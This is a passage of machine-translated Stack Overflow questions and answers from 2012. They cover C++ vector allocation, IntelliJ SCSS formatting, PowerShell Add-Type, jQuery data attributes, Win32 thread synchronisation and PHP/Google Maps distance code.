您可以使用一个分配器，该分配器的`construct`成员是无操作的，例如普通的默认可构造类型。请注意这意味着什么*，您可能想要分析和/或检查生成的代码以确保它是值得的。

*：假设`vector_type`是`std::vector`使用这种分配器的特殊化，然后`vector_type v(42); auto copy = v;`导致读取具有未指定值`copy`的元素。`v`这很容易出错。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-10-18T12:14:57.670

使用[std::vector::reserve](http://www.cplusplus.com/reference/stl/vector/reserve/)：

```
std::vector big_vec();
big_vec.reserve(100000); 
```

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-10-18T12:21:11.040

```
 int zeros[n*size(int)/size(T)];
 vector<T> big((T*)myints, (T*)myints + n); 
```

# intellij-idea - Intellij 重新格式化会破坏变量的 scss 默认值

> ID：12954369
> 
> 赞同：1
> 
> 时间：2012-10-18T12:13:47.633
> 
> 标签：intellij-idea, phpstorm, reformat

我正在使用 IntelliJ Idea，但在 SCSS 或 SASS 文件中使用“Ctrl + Alt + L”重新格式化时遇到问题。

我声明变量： `$myvariable: 15px !default;`

但是重新格式化函数会带来不需要的空格： `$myvariable: 15px ! default;`

如何告诉重新格式化功能跳过“！默认”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:33:45.123

可能您使用的旧版 PhpStorm 或 IntelliJ IDEA 仍然存在此错误。我已尝试使用[PhpStorm 5.0.2](http://www.jetbrains.com/phpstorm/download/index.html)，但无法重现此问题。

请注意，当前的 IDEA 11.1.3 版本也存在此问题，但[IDEA 12 EAP](http://confluence.jetbrains.net/display/IDEADEV/IDEA+12+EAP)工作正常。

# c# - Powershell.exe - 无法编译使用 var 的 C# 代码

> ID：12954373
> 
> 赞同：1
> 
> 时间：2012-10-18T12:13:54.623
> 
> 标签：c#, .net, powershell

我有以下 powershell 脚本：

```
# C-Sharp source for taking our screenshot
$Source = @" 
using System;
using System.Linq;

namespace Testing
{
    public static class TestClass
    {
        public static void DoTest()
        {
             var myLinq = "hello world";
        }
    }
}
"@

$assem = @("System.Core")
$null = Add-Type -ReferencedAssemblies $assem -TypeDefinition $Source -Language Csharp 
```

如果我通过 powershell.exe 运行它，`powershell.exe C:\test.ps1`我会收到以下错误：

```
无法添加类型。有编译错误。c:\Users\Administrator\AppData\Local\Temp\c9er05ba.0.cs(10) ：类型或 n
找不到 amespace 名称“var”（您是否缺少 using 指令或程序集引用？）

c:\Users\Administrator\AppData\Local\Temp\c9er05ba.0.cs(9) : {

c:\Users\Administrator\AppData\Local\Temp\c9er05ba.0.cs(10) : >>> var myLinq = "hello world";

c:\Users\Administrator\AppData\Local\Temp\c9er05ba.0.cs(11) : }

```

但是，如果我将此脚本复制并粘贴到[PowerGUI](http://powergui.org/index.jspa)中，它运行得很好。

我能找到的最有帮助的链接是[这个](https://stackoverflow.com/questions/5475122/how-to-use-add-type-with-path-and-also-language-csharpversion3)。所以我尝试将我的 -language 参数更改为 csharpversion3，但现在我得到了这个：

```
无法添加类型。有编译错误。(0) : 具有相同标识的程序集 'System.Core, Version=3.5.0.0, Cul
ture=neutral, PublicKeyToken=b77a5c561934e089' 已经被导入。尝试删除重复引用之一。

(1)：使用系统；

```

有什么想法可以让这个脚本正常运行吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T12:24:39.187

坚持`-language csharpversion3`但放弃这`-ReferencedAssemblies $assem`一点 - 这就是给你重复导入的原因。

我还必须添加`-IgnoreWarnings`以编译您的片段，但我想那是因为您没有发布整个示例。

总之，命令：

```
Add-Type  -TypeDefinition $Source -Language CsharpVersion3 -IgnoreWarnings 
```

将编译该代码而不会出错。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:32:27.483

使用 powershell.exe.config 在 Powershell V 2.0 上工作

```
<?xml version="1.0"?>
<configuration>
      <startup useLegacyV2RuntimeActivationPolicy="true">
          <supportedRuntime version="v4.0.30319"/>
          <supportedRuntime version="v2.0.50727"/>
      </startup>
</configuration> 
```

电源外壳代码：

```
$Source = @" 
using System;
using System.Linq;

namespace Testing
{
    public static class TestClass
    {
        public static void DoTest()
        {
             var myLinq = "hello world";
             Console.WriteLine(myLinq.ToString());
    }
    }
}
"@

$null = Add-Type -ReferencedAssemblies system.core -TypeDefinition $Source -Language Csharp 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:19:06.443

我不完全确定 Powershell 了解“var”的用法。替换您的代码如下；

```
string myLinq = "hello world"; 
```

看看你的进展如何。

# javascript - 使用哪种技术将任意字符串从模板引擎传递到 JavaScript（或者为什么不使用虚假的 HTML 属性）

> ID：12954375
> 
> 赞同：1
> 
> 时间：2012-10-18T12:14:10.597
> 
> 标签：javascript, jquery, django, jsp

不用说我的问题使用了哪个模板引擎。

我参与了在 JSP 页面中找到此类代码的项目：

```
<li class="clazz" attr="XXX">...</li>

```

*和从attr*属性中提取值的 jQuery 代码：

```
$(".clazz").click(function () {
   var v = $(this).attr("attr");
   ...
}

```

实际上*XXX*是 URL。我将 JSP 代码更改为：

```
<li class="clazz"><a href="XXX">...</a></li>

```

和JS代码：

```
$(".clazz").click(function () {
   var v = $(this).find("a").attr("href");
   ...
}

```

现在我达到了拥有有效 HTML 的目标。

使用虚假标签会简化代码，但会产生无效的 HTML。

有没有简单的方法将数据传递给 JavaScript 并保持代码的简单性？

使用哪种技术将任意字符串从模板引擎传递到 JavaScript？

我假设这些数据不应该呈现给用户，并期望它不应该像隐藏数据那样基于 CSS：

```
<span id="real-points-count" style="display:none">${param}

```

**更新**。这段代码如何：

```
<div class="clazz" min="MINDATA" max="MAXDATA">...<>

```

可以转换为将*MINDATA*和*MAXDATA*传递给 JavaScript 以获得有效的**HTML5**吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:26:28.967

如果您可以使用 HTML5，则可以使用`data-*`属性，这些属性可以让您添加自定义属性来存储 HTML 元素的数据。

例如

```
<li class="clazz" data-myattr="XXX">...</li> 
```

然后在 JS'

```
$(".clazz").click(function () {
   var v = $(this).data("myattr");
   ...
} 
```

参考：[HTML5 自定义数据属性（data *-）*](http://html5doctor.com/html5-custom-data-attributes/)*、[jQuery HTML5 数据](http://api.jquery.com/data/#data-html5)*[属性](http://api.jquery.com/data/#data-html5)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:27:37.440

你为什么不为此尝试本机javascript `onclick`。

看看这个..

```
<li class="clazz" onclick="myFunction('my_url')">...</li> 
```

然后编写这个函数，它接受你的 URL 作为输入 .. 即 ..

```
<script type="text/javascript">
function myFunction(inUrl) {
    ....
};
</script> 
```

通过这种方式，您可以维护有效的 HTML 并避免使用虚假标签。

注意：您可以通过任何号码。函数的参数，甚至是元素本身。

希望这可以帮助。

# c++ - 同步来自不同线程的输出流

> ID：12954379
> 
> 赞同：0
> 
> 时间：2012-10-18T12:14:18.123
> 
> 标签：c++, multithreading, winapi, synchronization, wofstream

我正在编写一个应用程序，它将来自不同线程的一些数据写入 xml 文件。我尝试使用事件核心对象同步它，但在文件中我得到错误的数据。我得到下一个结果

```
<file path="somePath" />
<file path="somePath" <file path="somePath" /> />.... 
```

但我希望得到

```
<file path="somePath" />
<file path="somePath" />
<file path="somePath" /> 
```

请参阅下面我的伪代码。其中有什么问题？

```
unsigned int WINAPI MyThread(void *p)
{
    std::wofstream outstr;
    outstr.open("indexingtest.xml", std::ios::app);
    do
    {
        if(somePredicat1)
        {
            WaitForSingleObject(hEvent, INFINITE);
            outstr <<"<file path=\""<< sFileName << "\"\n";
            outstr <<"\tsize=\""<< fileSize << "\" />\n";           
            ReleaseMutex(hMutex);
        }
         if(somePredicat3)
         {
             MyThread(sFileName);
         }
    }while(somePredicat2);
    outstr.close();
    FindClose( hSearch );
    return 0;
}

int _tmain(int argc, TCHAR *argv[])
{
    hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    //hMutex = CreateMutex(NULL, FALSE, 0);
    unsigned int ThreadID;
    HANDLE hThread1 = (HANDLE)_beginthreadex(NULL, 0, MyThread, L"D:\\*", 0, &ThreadID);
    HANDLE hThread2 = (HANDLE)_beginthreadex(NULL, 0, MyThread, L"C:\\*", 0, &ThreadID);
    SetEvent(hEvent);
    std::wcout << "\a" << std::endl;
    WaitForSingleObject( hThread1, INFINITE );
    return 0;
} 
```

更具体的代码

```
HANDLE hMutex = CreateMutex(NULL,FALSE, 0);
wchar_t** GetAllFilesImpl( wchar_t const* folder, wchar_t** res, size_t* pAllocated, size_t* pUsed )
{
    HANDLE hSearch;
    WIN32_FIND_DATAW fileinfo;
    size_t allocatedMemory = 0;

    hSearch = FindFirstFileW( folder, &fileinfo );
    if( hSearch != INVALID_HANDLE_VALUE ) {
        do {

            wchar_t* sFileName, ** tmp, sTmp[ 1024 ];
            long fileSize = 0;
            long creationDate;
            /* ignore ., .. */
            if( !wcscmp(fileinfo.cFileName, L".") ||
                !wcscmp(fileinfo.cFileName, L"..") )
                continue;
            sFileName = PathCreator( folder, fileinfo.cFileName );
            fileSize = fileinfo.nFileSizeLow;
            creationDate = fileinfo.ftCreationTime.dwHighDateTime;

            if(fileSize)
            {
                WaitForSingleObject(hMutex, INFINITE);
                std::wofstream outstr;
                            outstr.open("indexingtest.xml", std::ios::app);
                outstr.seekp(std::ios_base::end);
                outstr <<"<file path=\""<< sFileName << "\"\n";
                outstr <<"\tsize=\""<< fileSize << "\" />\n";
                outstr.seekp(std::ios_base::end);
                outstr.close();
                wprintf( L"%s\n", sFileName);
                ReleaseMutex(hMutex);
            }

            tmp = AddToArray( res, pAllocated, pUsed, sFileName );
            if( !tmp ) return FreeAllFilesMemory(res), NULL;
            res = tmp;

            if( fileinfo.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) {
                wcscpy_s( sTmp, sFileName );
                wcscat_s( sTmp, L"\\*" );
                tmp = GetAllFilesImpl( sTmp, res, pAllocated, pUsed );
                if( !tmp ) return NULL;
                res = tmp;
            }
        } while( FindNextFileW(hSearch, &fileinfo) );

        FindClose( hSearch );
    }
    return res;
}

unsigned int WINAPI GetAllFiles( void* folder )
{
    size_t nAllocated = 0, nUsed = 0;
    wchar_t** res = GetAllFilesImpl( (wchar_t *)folder, NULL, &nAllocated, &nUsed );
    if( res ) {
        /* to indicate end of result add a NULL string */
        wchar_t** tmp = AddToArray( res, &nAllocated, &nUsed, NULL );
        if( !tmp ) return FreeAllFilesMemory(res), -1;
        res = tmp;
    }
    std::wcout << "\a" << std::endl;
    return 0;
}
int _tmain(int argc, TCHAR *argv[])
{

    Sleep(1000);
    unsigned int ThreadID;
    HANDLE hThreads[3];
    hThreads[0] = (HANDLE)_beginthreadex(NULL, 0, GetAllFiles, L"D:\\*", 0, &ThreadID);
    hThreads[1] = (HANDLE)_beginthreadex(NULL, 0, GetAllFiles, L"C:\\Users\\Andrew\\Desktop\\*", 0, &ThreadID);
    hThreads[2] = (HANDLE)_beginthreadex(NULL, 0, GetAllFiles, L"E:\\*", 0, &ThreadID);
    unsigned int dw = WaitForMultipleObjects(3, hThreads, TRUE, INFINITE);
    CloseHandle(hFile);
    printf("finished\n");
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:24:59.250

您遇到的*最大*问题是每个线程都单独打开文件。而是在创建线程*之前*打开文件，然后使用互斥锁同步对文件的写入。

在伪代码中：

```
std::wofstream output_file;

void my_thread()
{
    do
    {
        if (some_condition)
        {
            lock_mutex();
            do_output();
            unlock_mutex();
        }
    } while (condition);
}

int main()
{
    output_file.open(...);

    create_thread();
    create_thread();

    output_file.close();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:39:40.143

1.  您应该在结束代码之前等待所有线程

    ```
    HANDLE aThread[2];

    ...

    aThread[0] =  (HANDLE)_beginthreadex(...
    aThread[1] =  (HANDLE)_beginthreadex(...

    WaitForMultipleObjects(THREADCOUNT, aThread, TRUE, INFINITE); 
    ```

2.  在进行输出之前，您正在等待事件。完成输出后，您释放互斥锁。这根本不符合逻辑。您应该等待互斥锁和事件。设置事件后，两个线程都将等待释放。因此，互斥锁不做任何事情。当您将事件句柄和互斥量句柄放入一个数组时，您也可以使用 WaitForMultipleObjects 来实现此目的：

    ```
    HANDLE hVarious[2];
    hVarious[0] = CreateEvent(NULL, TRUE, FALSE, NULL);
    // Note: this is a manual reset event. 
    // Thus is stays set until explicitly reset

    hVarious[1] = CreateMutex(NULL, FALSE, 0);

    // and now start the threads:
    aThread[0] =  (HANDLE)_beginthreadex(...
    aThread[1] =  (HANDLE)_beginthreadex(...

    // and set the event:
    SetEvent(hEvent);

    WaitForMultipleObjects(2, aThread, TRUE, INFINITE); 
    ```

    然后线程应如下所示：

    ```
    unsigned int WINAPI MyThread(void *p)
    {
      do
      {
        if(somePredicat1)
        {
          // wait for the mutex AND the event
          WaitForMultipleObjects(2, hVarious, TRUE, INFINITE);

          // do the file stuff in the mutex protected part       
          std::wofstream outstr;
          outstr.open("indexingtest.xml", std::ios::app);

          outstr <<"<file path=\""<< sFileName << "\"\n";
          outstr <<"\tsize=\""<< fileSize << "\" />\n";           

          outstr.close();
          FindClose( hSearch );
          ReleaseMutex(hVarious[1]);
        }
      }while(somePredicat2);
      return 0;
    } 
    ```

**请记住**：互斥锁的建立是为了保护并发应用程序中的资源。

我不知道`somePredicat1`和`somePredicat1`。这些参数在不同线程中使用时也可能会出现问题。但是，您观察到的错误输出是由错误的互斥锁使用引起的。

**评论后编辑：**

```
 if(somePredicat3)
    {
         MyThread(sFileName);
    } 
```

一个。线程本身作为函数调用而不关闭文件。

湾。您应该提供有关用途的更多详细信息`somePredicat3, somePredicat2, and somePredicat1`。

C。您必须使用某种排他性来保护输出文件，因为它被多个线程使用。您也可以使用[临界区对象](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682530%28v=vs.85%29.aspx)来执行此操作。

# php - 使用 PHP/Google 地图计算距离

> ID：12954386
> 
> 赞同：-1
> 
> 时间：2012-10-18T12:14:36.970
> 
> 标签：php, maps

我正在尝试创建一个简单的（或者我认为是）PHP/Google Maps 函数，它可以让我计算两个地址之间的距离。我是 PHP 新手，这就是我到目前为止所得到的，但是，出了点问题。

```
<section class="group">

        <label for="start">Start:</label>
        <input type="text" name="start" id="start" value="" />

        <label for="finish">Finish</label>
        <input type="text" name="finish" id="finish" value="" />

        <input type="button" value="Calculate distance" id="calculate-distance" />

        <div id="results"></div>

    </section>

    <?php
    function getLatLong($address) {

    $address = str_replace(' ', '+', $address);
    $url = 'http://maps.googleapis.com/maps/api/geocode/json?address='.$address.'&sensor=false';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $geoloc = curl_exec($ch);

    $json = json_decode($geoloc);
    return array($json->results[0]->geometry->location->lat,
    $json->results[0]->geometry->location->lng);

    }

    function Haversine($start, $finish) { 

    $theta = $start[1] - $finish[1];
    $distance = (sin(deg2rad($start[0])) * sin(deg2rad($finish[0]))) + (cos(deg2rad($start[0])) * cos(deg2rad($finish[0])) * cos(deg2rad($theta)));
    $distance = acos($distance);
    $distance = rad2deg($distance);
    $distance = $distance * 60 * 1.1515;

    return round($distance, 2);
     }

    $start = getLatLong('start');
    $finish = getLatLong('finish');

    $distance = Haversine($start, $finish);

    print('<p>The distance between ['.$start[0].', '.$start[1].'] and   ['.$finish[0].',    '.$finish[1].'] is '.$distance.' miles ('.($distance * 1.609344).'  km).</p>');
?> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-27T08:41:41.837

```
<?php
$from = "erode";
$to = "Chennai";

$from = urlencode($from);
$to = urlencode($to);

$data = file_get_contents("http://maps.googleapis.com/maps/api/distancematrix/json?origins=$from&destinations=$to&language=en-EN&sensor=false");
$data = json_decode($data);

$time = 0;
$distance = 0;

foreach($data->rows[0]->elements as $road) {
    $time += $road->duration->value;
    $distance += $road->distance->value;
}
$km=$distance/1000;
echo "To: ".$data->destination_addresses[0];
echo "<br/>";
echo "From: ".$data->origin_addresses[0];
echo "<br/>";
echo "Time: ".$time." seconds";
echo "<br/>";
echo "Distance: ".$distance." meters";
echo "<br/>";
echo $km;
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:44:13.170

只需复制和粘贴即可运行并玩得开心......

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!--
 Copyright 2008 Google Inc. 
  Licensed under the Apache License, Version 2.0: 
 http://www.apache.org/licenses/LICENSE-2.0 
 -->
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml">
  <head>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<script src="http://maps.google.com/maps?file=api&amp;v=2&amp;key=ABQIAAAAjU0EJWnWPMv7oQ-jjS7dYxSPW5CJgpdgO_s4yyMovOaVh_KvvhSfpvagV18eOyDWu7VytS6Bi1CWxw" type="text/javascript"></script>
<script type="text/javascript">

var map;
var pano;
var svClient;
var directions;
var route;
var vertices;
var vertexMap;
var stepToVertex;
var stepMap;
var currentLatLng;
var panoMetaData;
var close = false;
var bearing;
var nextBearing;
var nextVertexId;
var nextVertex;
var progressArray;
var progressDistance;
var currentStep;
var carMarker;

 var selectedStep = null;
 var driving = false;
 var advanceTimer = null;
 var advanceDelay = 1;
 function load() {
  if (GBrowserIsCompatible()) {
    var start = new GLatLng(37.090240,-95.712891);
    map = new GMap2(document.getElementById("map"));
    map.setCenter(start, 3);
    map.addControl(new GSmallMapControl());

    carMarker = getCarMarker(start);
    map.addOverlay(carMarker);
    carMarker.hide();

    svClient = new GStreetviewClient();
    pano = new GStreetviewPanorama(document.getElementById("streetview"));

    GEvent.addListener(pano, "initialized", function(loc) {
      panoMetaData = loc;
      moveCar();
    });

    GEvent.addListener(pano, "error", function(errorCode) {
      showStatus("The requested panorama could not be displayed");
    });

    directions = new GDirections(map);
    GEvent.addListener(directions, "load", function() {
      jumpInMyCar();
    });

    GEvent.addListener(directions, "error", function() {
      showStatus("Could not generate a route for the current start and end addresses");
    });
  }
}

function getCarMarker(start) {
  return new GMarker(start, getArrowIcon(0.0));
}
function setCarMarkerImage(bearing) {
  carMarker.setImage(getArrowUrl(bearing));
}
function generateRoute() {
  var from = document.getElementById("from").value;
  var to = document.getElementById("to").value;
  directions.load("from: " + from + " to: " + to, { preserveViewport: true, getSteps: true });
}

function jumpInMyCar() {
  route = directions.getRoute(0);
  collapseVertices(directions.getPolyline());
  map.setCenter(vertices[0], 16);
  renderTextDirections();
  checkCoverage(0);
}
function checkCoverage(step) {
  if (step > route.getNumSteps()) {
    hideStatus();
    stopDriving();
    jumpToVertex(0);
  } else {
    if (step == route.getNumSteps()) {
      ll = route.getEndLatLng();
    } else {
      ll = route.getStep(step).getLatLng();
    }

    svClient.getNearestPanorama(ll, function(svData) {
      if (svData.code == 500) {

        setTimeout("checkCoverage(" + step + ")", 1000);
      } else if (svData.code == 600) {

        showStatus("Street View coverage is not available for this route");
      } else {

        checkCoverage(step + 1);
      }
    });
  }
}
function jumpToVertex(idx) {
  currentLatLng = vertices[idx];
  nextVertex = vertices[idx + 1];
  nextVertexId = idx + 1;

      bearing = getBearingFromVertex(idx);
  nextBearing = getBearingFromVertex(idx + 1);

  setCarMarkerImage(bearing);
  carMarker.setLatLng(currentLatLng);
  carMarker.show();

  currentStep = stepMap[idx];
  constructProgressArray(idx);
  setProgressDistance();
  updateProgressBar(0);

  map.panTo(currentLatLng, 16);
  highlightStep(currentStep);
  checkDistanceFromNextVertex();

  pano.setLocationAndPOV(currentLatLng, { yaw:bearing, pitch:0 });
  svClient.getNearestPanorama(currentLatLng, function(loc) {
    if (loc.code == 500) {
      setTimeout("jumpToVertex(" + idx + ")", 1000);
    } else if (loc.code == 600) {
      jumpToVertex(nextVertexId);
    } else {
      panoMetaData = loc.location;
      panoMetaData.pov.yaw = bearing;
      moveCar();
    }
  });
}
function moveCar() {
  currentLatLng = panoMetaData.latlng;
  carMarker.setLatLng(currentLatLng);
  map.panTo(currentLatLng);
  svClient.getNearestPanorama(panoMetaData.latlng, function(svData) {
    if (svData.code == 500) {

      setTimeout("moveCar()", 1000);
    } else if (svData.code == 600) {

      jumpToVertex(nextVertexId);
    } else {
      panoMetaData.links = svData.links;
      checkDistanceFromNextVertex();
      if (driving) {
        advanceTimer = setTimeout("advance()", advanceDelay * 1000);
      }
    }
  });
}
function checkDistanceFromNextVertex() {
  close = false;
  var d = currentLatLng.distanceFrom(nextVertex);
  var b = getBearing(currentLatLng, nextVertex);
  if (getYawDelta(bearing, b) > 90) {
    incrementVertex();
    if (driving) {
      checkDistanceFromNextVertex();
    }

  } else {
    updateProgressBar(progressDistance - d);
    if (driving) {
      updateViewerDirections(progressDistance - d);
    }
    if (d < 10) {
      close = true;
    }
  }
}

function advance() {

  var selected = selectLink(bearing);
  if (close && nextBearing) {
    var selectedTurn = selectLink(nextBearing);
    if (selectedTurn.delta < 15) {
      selected = selectedTurn;
      incrementVertex();
    }
  }

  if (selected.delta > 40) {
    jumpToVertex(nextVertexId);
  } else {
    var panAngle = getYawDelta(panoMetaData.pov.yaw, panoMetaData.links[selected.idx].yaw);
    pano.panTo({ yaw:panoMetaData.links[selected.idx].yaw, pitch:0 });
    setTimeout(function() {
      pano.followLink(panoMetaData.links[selected.idx].yaw);
    }, panAngle * 10);
  }
}
function selectLink(yaw) {
  var Selected = new Object();

  for (var i = 0; i < panoMetaData.links.length; i++) {
    var d = getYawDelta(yaw, panoMetaData.links[i].yaw);
    if (Selected.delta == null || d < Selected.delta) {
      Selected.idx = i;
      Selected.delta = d;
    }
  }
  return Selected;
}
function incrementVertex() {
  if (! vertices[nextVertexId + 1]) {
    endReached();
  } else {
    nextVertexId++;
    nextVertex = vertices[nextVertexId];
        bearing = getBearingFromVertex(nextVertexId - 1);
    nextBearing = getBearingFromVertex(nextVertexId);
    setCarMarkerImage(bearing);
    if (stepMap[nextVertexId - 1] == currentStep) {
      progressArray.push(nextVertex);
    } else {
      currentStep = stepMap[nextVertexId - 1];
      highlightStep(currentStep);
      progressArray = [ currentLatLng, nextVertex ];
      updateProgressBar(0);
    }

    setProgressDistance();
  }
}
function endReached() {
  stopDriving();
  updateProgressBar(0);
  showInstruction("You have reached your destination");
  document.getElementById("step" + selectedStep).style.backgroundColor = "white";
  selectedStep = null;
}
function getBearingFromVertex(n) {
  var origin = vertices[n];
  var destination = vertices[n+1];
  if (destination != undefined) {
    return getBearing(origin, destination);
  } else {
    return null;
  }
}
function updateViewerDirections(distanceFromStartOfStep) {
  var lengthOfStep = route.getStep(currentStep).getDistance().meters;
  var distanceFromEndOfStep = (lengthOfStep - distanceFromStartOfStep);
  distanceFromEndOfStep *= 3.2808399;

  var uiDistance, unit;
  if (distanceFromEndOfStep > 7920) {
    distanceFromEndOfStep /= 5280;
    uiDistance = distanceFromEndOfStep.toFixed(0);
    unit = 'miles';
  } else if (distanceFromEndOfStep > 4620) {
    uiDistance = '1';
    unit = 'mile';
  } else if (distanceFromEndOfStep > 3300) {
    uiDistance = '&frac34;';
    unit = 'mile';
  } else if (distanceFromEndOfStep > 1980) {
    uiDistance = '&frac12;';
    unit = 'mile';
  } else if (distanceFromEndOfStep >  660) {
    uiDistance = '&frac14;';
    unit = 'mile';
  } else {
    uiDistance = (Math.round(distanceFromEndOfStep / 10)) * 10;
    unit = "ft";
  }

  if (route.getStep(currentStep + 1) != undefined) {
    showInstruction('In ' + uiDistance + ' ' + unit + ': ' + route.getStep(currentStep + 1).getDescriptionHtml());
  } else {
    showInstruction('In ' + uiDistance + ' ' + unit + ': You will reach your destination');
  }
}
function constructProgressArray(vertexId) {
  progressArray = new Array();
  var stepStart = stepToVertex[currentStep];
  for (var i = stepToVertex[currentStep]; i <= vertexId + 1; i++) {
    progressArray.push(vertices[i]);
  }
}
function setProgressDistance() {
  var polyline = new GPolyline(progressArray);
  progressDistance = polyline.getLength();
}
function updateProgressBar(progress) {
  progress = (progress < 0 ? 0 : progress);
  var stepLength = route.getStep(currentStep).getDistance().meters;
  setProgressBarLength(1 - (progress / stepLength));
}
function setProgressBarLength(progress) {
  var width = (636 * progress);
  if (width < 0) {
    width = 0;
  }
  document.getElementById("progressBar").style.width = width + "px";
}
function getYawDelta(a, b) {
  var d = Math.abs(sanitiseYaw(a) - sanitiseYaw(b));
  if (d > 180) {
    d = 360 - d;
  }
  return d;
}
function sanitiseYaw(yaw) {
  if (yaw > 360 || yaw < 360) {
    yaw = yaw % 360;
  }
  return yaw;
}
  function getArrowIcon(bearing) {
  var icon = new GIcon();
  icon.image = getArrowUrl(bearing);
  icon.iconSize = new GSize(24, 24);
  icon.iconAnchor = new GPoint(12, 12);
  return icon;
}

function getArrowUrl(bearing) {
  var id = (3 * Math.round(bearing / 3)) % 120;
  return "http://maps.google.com/mapfiles/dir_" + id + ".png";
}

   function collapseVertices(path) {
 vertices = new Array();
 vertexMap = new Array(path.getVertexCount());

 vertices.push(path.getVertex(0));
 vertexMap[0] = 0;
 for (var i = 1; i < path.getVertexCount(); i++) {
   if (! path.getVertex(i).equals(vertices[vertices.length - 1])) {
     vertices.push(path.getVertex(i));
   }
   vertexMap[i] = vertices.length - 1;
 }

 stepToVertex = new Array(route.getNumSteps());
 stepMap      = new Array(vertices.length);

 for (var i = 0; i < route.getNumSteps(); i++) {
   stepToVertex[i] = vertexMap[route.getStep(i).getPolylineIndex()];
 }

 var step = 0;
 for (var i = 0; i < vertices.length; i++) {
   if (stepToVertex[step + 1] == i) {
     step++;
   }
   stepMap[i] = step;
 }
}

 function renderTextDirections() {
  var startAddress = route.getStartGeocode().address;
  var   endAddress = route.getEndGeocode().address;
  var html  =  getDirectionsWaypointHtml(startAddress, "A");
      html +=  getDivHtml("summary", "", route.getSummaryHtml());
  for (var n = 0; n < route.getNumSteps(); n++) {
    html += '<a onclick="selectStep(' + n + ')">';
    html += getDivHtml("step" + n, "dstep", route.getStep(n).getDescriptionHtml());
    html += '</a>';
  }
  html += getDirectionsWaypointHtml(endAddress, "B");
  document.getElementById("directions").innerHTML = html;
  setWaypointIcon('A');
  setWaypointIcon('B');
}
function getDirectionsWaypointHtml(address, letter) {
 var content = getDivHtml('letter' + letter, 'letterIcon', "");
     content += '<span class="waypointAddress">' + address + '</span>';
  return getDivHtml("wayPoint" + letter, "waypoint", content);
}
function setWaypointIcon(letter) {
  var png = 'http://maps.google.com/intl/en_us/mapfiles/icon_green' + letter + '.png';
  document.getElementById('letter' + letter).style.backgroundImage = 'url(' + png + ')';
}
function getDivHtml(id, cssClass, content) {
  var div = "<div";
  if (id != "") {
    div += ' id="' + id + '"';
  }

  if (cssClass != "") {
    div += ' class="' + cssClass + '"';
  }

  div += '>' + content + '</div>';
  return div;
}
function selectStep(i) {
  var vertex = vertexMap[route.getStep(i).getPolylineIndex()];
  stopDriving();
  jumpToVertex(vertex);
}
function highlightStep(i) {
  if (selectedStep != null) {
    document.getElementById("step" + selectedStep).style.backgroundColor = "white";
  }
  document.getElementById("step" + i).style.backgroundColor = "#eeeeff";
  selectedStep = i;
}
function startDriving() {
  hideInstruction();
  document.getElementById("route").disabled = true;
  document.getElementById("stopgo").value = "Stop";
  document.getElementById("stopgo").setAttribute('onclick', 'stopDriving()'); 
  document.getElementById("stopgo").onclick = function() { stopDriving(); }
  driving = true;
  advance();
}
function stopDriving() {
  driving = false;

  if (advanceTimer != null) {
    clearTimeout(advanceTimer);
    advanceTimer = null;
  }

  document.getElementById("route").disabled = false;
  document.getElementById("stopgo").disabled = false;
  document.getElementById("stopgo").value = "Drive";
  document.getElementById("stopgo").setAttribute('onclick', 'startDriving()'); 
  document.getElementById("stopgo").onclick = function() { startDriving(); }
  showInstruction('Press <b>Drive</b> to follow your route');
}
function setSpeed() {
  advanceDelay = document.getElementById('speed').selectedIndex;
}
function showStatus(message) {
  hideInstruction();
  document.getElementById("status").innerHTML = message;
  document.getElementById("status").style.display = "block";
  document.getElementById("streetview").style.display = "none";
}
function hideStatus() {
  document.getElementById("status").style.display = "none";
  document.getElementById("streetview").style.display = "block";
}
function showInstruction(message) {
  document.getElementById("instruction").innerHTML = message;
  document.getElementById("instruction").style.display = "block";
}
function hideInstruction() {
  document.getElementById("instruction").style.display = "none";
}
function getBearing(origin, destination) {
  if (origin.equals(destination)) {
    return null;
  }
  var lat1 = origin.lat().toRad();
  var lat2 = destination.lat().toRad();
  var dLon = (destination.lng()-origin.lng()).toRad();

  var y = Math.sin(dLon) * Math.cos(lat2);
  var x = Math.cos(lat1)*Math.sin(lat2) -
          Math.sin(lat1)*Math.cos(lat2)*Math.cos(dLon);
  return Math.atan2(y, x).toBrng();
}
Number.prototype.toRad = function() {
  return this * Math.PI / 180;
}
Number.prototype.toDeg = function() {
  return this * 180 / Math.PI;
}
Number.prototype.toBrng = function() {
  return (this.toDeg()+360) % 360;
}
</script>
<style>

body {
position: relative;
}

#content {
width: 640px;
padding: 8px;
background-color: #eeeeff;
border: 1px solid #000066;
}

#svPanel {
width: 638px;
height: 319px;
position: relative; 
}

#status {
position: absolute;
top: 120px;
left: 0px;
width: 638px;
text-align: center;
font: 32pt sans-serif;
color: #666666;
background-color: white; 
}

#instruction {
  position: absolute;
  top: 295px;
  left: 0px;
  width: 638px;
  text-align: center;
  font: 16pt sans-serif;
  color: #eeeeee;
  display: none;
}

#svPanel, #directions, #map {
 border: 1px solid black;
background-color: white;
}

#streetview {
position: absolute;
top: 0px;
left: 0px;
width: 638px;
height: 319px;
}

#progressBorder {
position: relative;
width: 638px;
height: 10px;
margin: 2px 0px 2px 0px;
